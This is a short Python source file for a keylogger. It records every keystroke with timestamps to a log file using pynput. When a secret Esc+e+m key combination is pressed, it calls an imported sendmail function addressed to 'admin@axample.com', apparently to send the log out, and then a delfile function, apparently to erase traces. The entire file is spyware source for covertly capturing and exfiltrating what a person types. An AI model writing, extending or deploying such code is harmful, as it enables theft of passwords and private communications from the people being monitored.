import logging
import os
import time

from pynput.keyboard import Listener
import keyboard
from mailto import sendmail
from dellog import delfile


# create log file of pressed keys
def starting():
    if not os.path.exists(os.getcwd() + '/logs/'):
        os.mkdir('logs')

    log_directory = os.getcwd() + '/logs/'  # where to save the file

    # create file
    logging.basicConfig(filename=(log_directory + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

    # if keyboard.is_pressed('Esc') and keyboard.is_pressed('e') and keyboard.is_pressed('m'):
    #     exit()

    # function in logging
    def on_press(key):
        logging.info(key)
        if keyboard.is_pressed('Esc') and keyboard.is_pressed('e') and keyboard.is_pressed('m'):
            exit()
        # when press key save the key in file

    with Listener(on_press=on_press) as listener:
        listener.join()  # infinite cycle

    if keyboard.is_pressed('Esc') and keyboard.is_pressed('e') and keyboard.is_pressed('m'):
        sendmail("admin@axample.com")
        exit()

    delfile()
